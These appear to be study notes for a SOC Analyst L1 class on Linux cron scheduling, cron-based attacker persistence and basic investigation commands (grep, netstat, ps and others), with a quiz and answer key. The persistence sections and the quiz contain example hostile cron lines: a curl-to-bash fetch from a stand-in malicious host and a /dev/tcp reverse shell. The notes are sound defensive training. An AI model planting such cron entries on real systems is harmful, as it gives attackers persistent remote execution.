# SOC Analyst L1 — Class 24
## Linux Crontab + Linux Basic Commands

---

# ⚡ 30-SECOND RECALL

## Cron = Linux ka "Alarm Clock" ⏰

- Cron is a Linux task scheduler.
- It automatically runs commands/scripts at scheduled times.
- It is useful for:
  - Automation
  - Health monitoring
- Attackers can use Cron to hide persistence mechanisms.

---

# 🔥 MUST REMEMBER

## 1. Linux Task Scheduling

| Tool | Meaning |
|---|---|
| `at` | One-time execution |
| `cron` | Recurring execution |
| `anacron` | Handles missed jobs |

### Important

- `at` does not support recurring tasks.
- Cron fails if the system is OFF when the job should run.
- Some Cron tasks require root privileges.

---

# 2. Crontab

- Crontab = **Cron Table**.
- It is the configuration file where schedules are defined.
- Each entry has **5 time fields + command**.

### Basic Format

    * * * * * command_to_execute

---

# 3. Five Cron Fields ⭐

    * * * * * command
    │ │ │ │ │
    │ │ │ │ └── Day of Week → 0–6
    │ │ │ └──── Month → 1–12
    │ │ └────── Day of Month → 1–31
    │ └──────── Hour → 0–23
    └────────── Minute → 0–59

### Day of Week

- `0` = Sunday
- `6` = Saturday

---

# 4. Cron Operators

| Symbol | Meaning | Example |
|---|---|---|
| `*` | Every possible value | `*` |
| `,` | Multiple values | `1,15,30` |
| `-` | Range | `1-5` |
| `/` | Increment | `*/10` |

### Easy Memory

- `*` → Every
- `,` → Multiple
- `-` → Range
- `/` → Every X

### Example

    */10 * * * *

→ Every 10 minutes.

---

# 5. Important Crontab Commands

### Edit Crontab

    crontab -e

### View User Crontab

    crontab -l

---

# 6. Practical Cron Examples

### Backup Every Night at 2:30 AM

    30 02 * * * tar -zcf /backups/home.tgz /home/user/

### Security Scan Every Sunday at Midnight

    0 0 * * 0 /usr/local/bin/lynis scan system

### Clean `/tmp` Logs Every 15 Minutes

    */15 * * * * rm /tmp/*.log

---

# 7. Where Cron Lives 🔎

## User Crontabs

    /var/spool/cron/crontabs/

- Managed by the `crontab` command.

## System Crontabs

    /etc/crontab
    /etc/cron.d/

- Usually require root privileges.
- Include an extra field for the username running the command.

## Periodic Folders

    /etc/cron.daily/
    /etc/cron.hourly/
    /etc/cron.monthly/

---

# 8. Why Cron Matters for SOC L1

## Persistence 🚨

Attackers can create a Cron job so malware restarts even if the server reboots.

### Example Scenario

- Weird outbound connection
- Connection to a C2 server
- Connection happens every hour

Check all crontabs.

Example:

    0 * * * * curl http://malicious-site.com/shell.sh | bash

---

# 9. Defensive Uses of Cron

Cron can also help SOC L1 analysts.

### Log Rotation

- Prevent logs from filling the disk.
- Help prevent SIEM agent problems caused by a full disk.

### Automated Health Checks

- Send an alert if a critical security service stops.

Examples:

    auditd
    fail2ban

### Snapshotting

- Regularly export a list of running processes.
- Use it for baseline comparison.

---

# 10. Cron Log Analysis

Check:

    /var/log/syslog

or:

    /var/log/cron

### Purpose

- See which Cron jobs were executed.

### Red Flag 🚩

A job:

- Runs under `www-data`
- Executes a script from `/tmp/`

→ Investigate.

---

# 11. Cron Hardening

## `/etc/cron.allow`

- Only users listed here can use Cron.

## `/etc/cron.deny`

- Users listed here are blocked.

### IMPORTANT ⭐

If `/etc/cron.allow` exists:

→ Linux ignores `/etc/cron.deny`.

If neither exists:

→ Depending on the distribution, either everyone can use Cron or only root.

---

# 12. SOC Threat — Persistence 🚨

Example:

    */10 * * * * malware.sh

Meaning:

- Run `malware.sh` every 10 minutes.
- Malware executes every 10 minutes continuously.

---

# 13. Reverse Shell Persistence 🚨

Example:

    * * * * * bash -i >& /dev/tcp/IP/4444

Every minute:

1. Launch Bash shell.
2. Connect to attacker IP.
3. Give remote command execution.

---

# 14. Real SOC Scenario ⭐

    SSH compromise
          ↓
    Cron job added
          ↓
    Persistent reverse shell

### Remember

**SSH compromise → Cron job → Persistent reverse shell**

---

# 🧠 SOC ANALYST MINDSET

Don't ask only:

> "What command ran?"

Ask:

1. Why was it used?
2. What was the attacker trying to achieve?
3. What changed after execution?

---

# 🐧 LINUX BASIC COMMANDS

# 15. `grep`

### Purpose

- Search text patterns in files.

### Syntax

    grep [options] "pattern" filename

### Example

    grep "failed password" /var/log/auth.log

### Common Options

- `-i` → Ignore case
- `-v` → Show non-matching lines
- `-n` → Show line numbers
- `-r` → Recursive search
- `-A` → Show lines after the match

### SOC Use

- Search failed logins.
- Find suspicious IPs/keywords.
- Quickly filter logs.

### Remember

    grep = SEARCH

---

# 16. `netstat`

### Purpose

- Display network connections.
- Display listening ports.
- Display network statistics.

### Syntax

    netstat [options]

### Example

    netstat -antp

### Common Options

- `-a` → All connections/ports
- `-n` → Numeric addresses/ports
- `-t` → TCP
- `-u` → UDP
- `-p` → Process using connection
- `-l` → Listening ports

### SOC Use

- Detect reverse shells.
- Investigate suspicious outbound connections.
- Discover open/listening ports.

### Remember

    netstat = NETWORK

---

# 17. `ps`

### Purpose

- Reports a snapshot of current processes.

### Syntax

    ps [options]

### Example

    ps aux

### Common Options

- `a` → Processes for all users
- `u` → Display user information
- `x` → Include processes without a controlling terminal
- `f` → Full-format listing

### SOC Use

- Identify suspicious processes.
- Check process activity.
- Check processes running as root.

### Remember

    ps = PROCESSES

---

# 18. `top`

### Purpose

- Real-time view of processes and resource usage.

### Command

    top

### Important Information

- `%CPU` → CPU usage
- `%MEM` → Memory usage
- `LOAD` → System load average
- `PID` → Process ID
- `COMMAND` → Running process

### SOC Use

- Monitor high CPU usage.
- Monitor high memory usage.
- Detect resource-hungry processes.
- Observe possible crypto-mining activity.
- Monitor system performance.

### Remember

    top = LIVE RESOURCE VIEW

---

# 19. `chmod`

### Purpose

- Change file permissions.

### Syntax

    chmod [permissions] filename

### Example

    chmod 755 script.sh

### Permission Values

    r = 4
    w = 2
    x = 1

    7 = rwx
    6 = rw-
    5 = r-x
    0 = ---

### SOC Use

- Restrict or allow file execution.
- Harden system permissions.
- Detect unauthorized permission changes.

### Remember

    chmod = PERMISSIONS

---

# 20. `chown`

### Purpose

- Change file/directory ownership.

### Syntax

    chown [user]:[group] filename

### Example

    chown root:root file.txt

### SOC Use

- Fix incorrect ownership.
- Detect ownership changes.
- Audit sensitive directory access.

### Remember

    chown = OWNERSHIP

---

# 21. `tail`

### Purpose

- Display the last part of a file.

### Syntax

    tail [options] filename

### Example

    tail -f /var/log/auth.log

### Common Options

- `-n 20` → Show last 20 lines
- `-f` → Follow live log output
- `-F` → Continue following when file is recreated

### SOC Use

- Monitor logs in real time.
- Track live attacks/login attempts.
- Quickly view recent events.

### Remember

    tail = RECENT/LIVE LOGS

---

# 22. `ls`

### Purpose

- List files/directories.

### Syntax

    ls [options] [path]

### Example

    ls -lah /var/log

### SOC Use

- View files.
- Check permissions.
- Check ownership.
- Check timestamps.

### Remember

    ls = LIST

---

# 23. `cd`

### Purpose

- Change directory.

### Example

    cd /var/log

### Remember

    cd = CHANGE DIRECTORY

---

# 24. `cat`

### Purpose

- Display file content.

### Example

    cat /etc/passwd

### Remember

    cat = READ FILE

---

# 25. `less`

### Purpose

- View file content page-by-page.

### Example

    less /var/log/syslog

### SOC Use

- View large files.

### Remember

    less = PAGE-BY-PAGE READING

---

# 26. `df`

### Purpose

- Display disk-space usage.

### Example

    df -h

### SOC Use

- Check disk usage.
- Investigate storage problems.

### Remember

    df = DISK SPACE

---

# 27. `free`

### Purpose

- Display memory usage.

### Example

    free -m

### SOC Use

- Check RAM usage.
- Investigate unusual memory consumption.

### Remember

    free = MEMORY

---

# 28. `who`

### Purpose

- Show currently logged-in users.

### Example

    who

### SOC Use

- See currently logged-in users.
- Investigate unexpected user sessions.

### Remember

    who = LOGGED-IN USERS

---

# 29. `history`

### Purpose

- Display command history.

### Example

    history

### SOC Use

- Review executed commands.
- Investigate activity.

### Remember

    history = COMMAND HISTORY

---

# 30. `find`

### Purpose

- Search files and directories.

### Syntax

    find [path] -name "file"

### Example

    find / -name suspicious.sh

### SOC Use

- Find suspicious files.
- Search hidden files.
- Locate potentially malicious scripts.

### Remember

    find = SEARCH FILES

---

# 31. `du`

### Purpose

- Display directory size/usage.

### Syntax

    du -sh [path]

### Example

    du -sh /var/log

### SOC Use

- Check directory size.
- Investigate unusual disk usage.

### Remember

    du = DIRECTORY USAGE

---

# 📁 IMPORTANT LINUX LOG PATHS

| Path | Purpose |
|---|---|
| `/var/log/auth.log` | Authentication logs |
| `/var/log/syslog` | System logs |
| `/var/log/kern.log` | Kernel logs |
| `/var/log/dpkg.log` | Package install logs |
| `/var/log/secure` | RHEL/CentOS authentication logs |
| `/var/log/messages` | General system logs |
| `/var/log/apache2/` | Apache web logs |
| `/var/log/nginx/` | Nginx web logs |

---

# 🧠 SOC L1 TIPS

- Always check logs first:

      /var/log/

- Use `grep` + `tail` for quick investigation.
- Combine `ps` + `netstat` to find suspicious activity.
- Monitor resource usage with `top`.
- Always validate before making changes.
- Document findings.
- Escalate if needed.
- Practice regularly.
- Speed comes with experience.

---

# ⭐ INTERVIEW Q&A

### Q1. What is Cron?

**Answer:**  
Cron is a Linux task scheduler that runs commands automatically at scheduled times.

### Q2. What is Crontab?

**Answer:**  
Crontab is the configuration file where scheduled jobs are defined.

### Q3. How many time fields does Cron have?

**Answer:**  
Five.

### Q4. What are the five Cron fields?

**Answer:**

    Minute
    Hour
    Day of Month
    Month
    Day of Week

### Q5. What does `crontab -e` do?

**Answer:**  
It edits the crontab.

### Q6. What does `crontab -l` do?

**Answer:**  
It displays the user crontab.

### Q7. Why is Cron important for SOC?

**Answer:**  
Attackers can use Cron for persistence.

### Q8. Where are user crontabs?

**Answer:**

    /var/spool/cron/crontabs/

### Q9. Where are system crontabs?

**Answer:**

    /etc/crontab
    /etc/cron.d/

### Q10. Which logs can be checked for Cron?

**Answer:**

    /var/log/syslog
    /var/log/cron

### Q11. What is `grep` used for?

**Answer:**  
Searching text patterns.

### Q12. What is `netstat` used for?

**Answer:**  
Checking network connections and ports.

### Q13. What is `ps` used for?

**Answer:**  
Checking running processes.

### Q14. What is `top` used for?

**Answer:**  
Real-time process and resource monitoring.

### Q15. What is `chmod` used for?

**Answer:**  
Changing file permissions.

### Q16. What is `chown` used for?

**Answer:**  
Changing file/directory ownership.

---

# 📝 QUESTION PAPER MODE

## Try answering without looking above.

1. What is Cron?
2. What is Crontab?
3. What are the 5 Cron fields?
4. What does `*` mean?
5. What does `,` mean?
6. What does `-` mean?
7. What does `/` mean?
8. Difference between `at`, Cron and Anacron?
9. What does `crontab -e` do?
10. What does `crontab -l` do?
11. Where are user crontabs stored?
12. Where are system crontabs stored?
13. Why can attackers use Cron?
14. What does this mean?

        */10 * * * * malware.sh

15. What does this mean?

        * * * * * bash -i >& /dev/tcp/IP/4444

16. Which logs can be checked for Cron?
17. What is `/etc/cron.allow`?
18. What is `/etc/cron.deny`?
19. What is `grep` used for?
20. What is `netstat` used for?
21. What is `ps` used for?
22. What is `top` used for?
23. What is `chmod` used for?
24. What is `chown` used for?
25. What is `tail` used for?
26. What is `find` used for?

---

# ✅ ANSWER KEY

1. Linux task scheduler.
2. Configuration file for scheduled jobs.
3. Minute, Hour, Day of Month, Month, Day of Week.
4. Every possible value.
5. Multiple discrete values.
6. Range of values.
7. Increment.
8. `at` = one-time, Cron = recurring, Anacron = handles missed jobs.
9. Edit crontab.
10. View user crontab.
11. `/var/spool/cron/crontabs/`
12. `/etc/crontab` and `/etc/cron.d/`
13. For persistence.
14. Run `malware.sh` every 10 minutes.
15. Every minute: launch Bash, connect to attacker IP and give remote command execution.
16. `/var/log/syslog` and `/var/log/cron`
17. Only listed users can use Cron.
18. Listed users are blocked from Cron.
19. Search text patterns.
20. Network connections and ports.
21. Running processes.
22. Real-time process/resource monitoring.
23. File permissions.
24. File/directory ownership.
25. Last part/live output of a file.
26. Search files and directories.

---

# 🧩 FINAL MEMORY MAP

    LINUX SOC L1
          │
          ├── CRON
          │     │
          │     ├── Schedule jobs
          │     ├── Automation
          │     ├── Health monitoring
          │     └── Attacker persistence
          │
          └── LINUX COMMANDS
                │
                ├── grep → Search
                ├── netstat → Network
                ├── ps → Processes
                ├── top → Resources
                ├── chmod → Permissions
                ├── chown → Ownership
                ├── tail → Logs
                ├── ls → List
                ├── cd → Directory
                ├── cat → Read
                ├── less → Page-by-page
                ├── df → Disk
                ├── free → Memory
                ├── who → Users
                ├── history → Commands
                ├── find → Files
                └── du → Directory size

---

# 🔥 ONE-MINUTE REVISION

**Cron = Scheduled Linux tasks.**

**Cron can be abused for persistence.**

    crontab -e → Edit
    crontab -l → View

### Cron Locations

    /var/spool/cron/crontabs/
    /etc/crontab
    /etc/cron.d/

### Cron Logs

    /var/log/syslog
    /var/log/cron

### Core Commands

    grep     → Search
    netstat  → Network
    ps       → Processes
    top      → Resources
    chmod    → Permissions
    chown    → Ownership
    tail     → Logs
    ls       → List
    cd       → Directory
    cat      → Read
    less     → Page-by-page
    df       → Disk
    free     → Memory
    who      → Users
    history  → Commands
    find     → Files
    du       → Directory size

### Most Important SOC Mindset

**Don't only ask: "What command ran?"**

Ask:

    Why was it used?
    What was the attacker trying to achieve?
    What changed after execution?

---